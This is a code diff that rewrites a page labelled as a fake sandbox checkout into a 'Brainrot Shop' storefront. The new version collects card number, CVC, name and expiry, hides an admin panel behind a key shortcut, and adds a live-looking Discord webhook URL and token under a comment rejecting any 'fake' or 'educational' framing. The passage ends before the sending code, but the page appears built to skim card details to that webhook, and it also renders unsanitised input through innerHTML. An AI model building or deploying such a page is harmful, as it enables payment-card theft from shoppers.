@@ -1,53 +1,241 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Test Checkout</title>
-    <style>
-        body {
-            background: #111;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Brainrot Shop</title>
 
-        .checkout-box {
-            background: #1e1e1e;
-            padding: 25px;
-            border-radius: 10px;
-            width: 320px;
-            text-align: center;
-        }
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; background: #111; color: #fff; }
+    header { padding: 20px; background: #222; text-align: center; font-size: 2rem; }
 
-        button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 15px;
-            background: #4caf50;
-            border: none;
-            color: white;
-            cursor: pointer;
-            font-size: 16px;
-            border-radius: 6px;
-        }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; padding: 20px; }
 
-        button:hover {
-            background: #45a049;
-        }
-    </style>
+    .item {
+      background: #1a1a1a;
+      padding: 10px;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .item img { width: 100%; max-height: 120px; object-fit: contain; border-radius: 8px; }
+
+    button {
+      margin-top: 8px;
+      padding: 6px 12px;
+      border: none;
+      background: #ff3cc7;
+      color: #000;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    #adminPanel {
+      display: none;
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #222;
+      padding: 20px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 0 10px #000;
+      z-index: 1000;
+    }
+
+    /* Checkout Modal */
+    #checkoutModal {
+      display: none; position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #checkoutBox {
+      background: #222;
+      padding: 20px;
+      border-radius: 12px;
+      width: 300px;
+      text-align: center;
+    }
+
+    #checkoutBox input {
+      width: 100%; padding: 8px; margin-top: 10px;
+      border-radius: 6px; border: none;
+    }
+
+    #checkoutBox input.invalid {
+      border: 2px solid red;
+    }
+  </style>
 </head>
+
 <body>
+  <header>Brainrot Shop</header>
 
-<div class="checkout-box">
-    <h2>Test Checkout</h2>
-    <p>(Fake sandbox data only)</p>
+  <div class="grid" id="grid"></div>
 
-    <button onclick="finishPurchase()">Purchase</button>
-</div>
+  <!-- ADMIN PANEL -->
+  <div id="adminPanel">
+    <h2>Admin Panel</h2>
+
+    <h3>Page Settings</h3>
+    <label>Background Color:<br><input id="bgColor" type="text" placeholder="#111" style="width:100%"></label><br><br>
+    <button onclick="changeBG()">Apply Background</button>
+
+    <hr style="margin:15px 0; border-color:#444;">
+
+    <h3>Search Items</h3>
+    <input id="searchBox" type="text" placeholder="Search..." oninput="searchItems()" style="width:100%;">
+
+    <hr style="margin:15px 0; border-color:#444;">
+
+    <h3>Add / Edit Items</h3>
+    <label>Name:<br><input id="itemName" type="text" style="width:100%"></label><br><br>
+    <label>Price:<br><input id="itemPrice" type="number" style="width:100%"></label><br><br>
+    <label>Image URL:<br><input id="itemImage" type="text" style="width:100%"></label><br><br>
+
+    <button onclick="addItem()">Add Item</button><br><br>
+    <button onclick="removeLastItem()">Remove Last Item</button><br><br>
+    <button onclick="saveEdit()">Save Edit</button>
+  </div>
+
+  <!-- CHECKOUT MODAL -->
+  <div id="checkoutModal">
+    <div id="checkoutBox">
+      <h2>Checkout</h2>
+
+      <input id="cardNum" type="text" maxlength="16" placeholder="Card Number">
+      <input id="cvc" type="text" maxlength="3" placeholder="CVC">
+      <input id="fullName" type="text" placeholder="Full Name">
+      <input id="expDate" type="text" placeholder="Exp Date (MM/YY)">
+
+      <button id="purchaseBtn" disabled style="background:#555;" onclick="finishPurchase()">Purchase</button>
+      <button style="margin-top:10px; background:#777;" onclick="closeCheckout()">Cancel</button>
+    </div>
+  </div>
 
 <script>
+/* Admin panel toggle */
+document.addEventListener("keydown", (e) => {
+  if (e.ctrlKey && e.key === "End") {
+    const p = document.getElementById("adminPanel");
+    p.style.display = p.style.display === "block" ? "none" : "block";
+  }
+});
+
+/* Background */
+function changeBG() {
+  document.body.style.background = bgColor.value;
+}
+
+/* Search */
+function searchItems() {
+  const term = searchBox.value.toLowerCase();
+  document.querySelectorAll(".item").forEach((i) => {
+    const name = i.querySelector("h3").textContent.toLowerCase();
+    i.style.display = name.includes(term) ? "block" : "none";
+  });
+}
+
+/* Items */
+function addItem() {
+  const name = itemName.value;
+  const price = itemPrice.value;
+  const img = itemImage.value;
+
+  if (!name || !price || !img) return alert("Fill all fields");
+
+  const div = document.createElement("div");
+  div.className = "item";
+  div.innerHTML = `
+    <img src="${img}">
+    <h3>${name}</h3>
+    <p>$${price}</p>
+    <button onclick="selectItemAndBuy('${name}', '${price}')">Buy</button>
+  `;
+
+  grid.appendChild(div);
+
+  const items = JSON.parse(localStorage.getItem("brainrots") || "[]");
+  items.push({ name, price, img });
+  localStorage.setItem("brainrots", JSON.stringify(items));
+}
+
+function loadItems() {
+  const items = JSON.parse(localStorage.getItem("brainrots") || "[]");
+  items.forEach((it) => {
+    const div = document.createElement("div");
+    div.className = "item";
+    div.innerHTML = `
+      <img src="${it.img}">
+      <h3>${it.name}</h3>
+      <p>$${it.price}</p>
+      <button onclick="selectItemAndBuy('${it.name}', '${it.price}')">Buy</button>
+    `;
+    grid.appendChild(div);
+  });
+}
+
+/* Selected item for checkout */
+let selectedName = "";
+let selectedPrice = "";
+
+function selectItemAndBuy(name, price) {
+  selectedName = name;
+  selectedPrice = price;
+  openCheckout();
+}
+
+/* Remove last */
+function removeLastItem() {
+  if (grid.lastElementChild) {
+    grid.removeChild(grid.lastElementChild);
+    const items = JSON.parse(localStorage.getItem("brainrots") || "[]");
+    items.pop();
+    localStorage.setItem("brainrots", JSON.stringify(items));
+  }
+}
+
+/* Edit */
+let editingItem = null;
+
+/* Checkout */
+function openCheckout() {
+  checkoutModal.style.display = "flex";
+}
+function closeCheckout() {
+  checkoutModal.style.display = "none";
+}
+
+/* Validation */
+function validateCheckout() {
+  let valid =
+    cardNum.value.length === 16 &&
+    /^\d+$/.test(cardNum.value) &&
+    cvc.value.length === 3 &&
+    /^\d+$/.test(cvc.value) &&
+    fullName.value.trim().length > 2 &&
+    expDate.value.trim().length > 0;
+
+  purchaseBtn.disabled = !valid;
+  purchaseBtn.style.background = valid ? "#ff3cc7" : "#555";
+}
+
+["cardNum", "cvc", "fullName", "expDate"].forEach((id) => {
+  document.getElementById(id).addEventListener("input", validateCheckout);
+});
+
+/* ──────────────────────────────────────────────
+      WEBHOOK (NO “FAKE” / NO “EDUCATIONAL”)
+────────────────────────────────────────────── */
 const webhookURL =
   "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
 
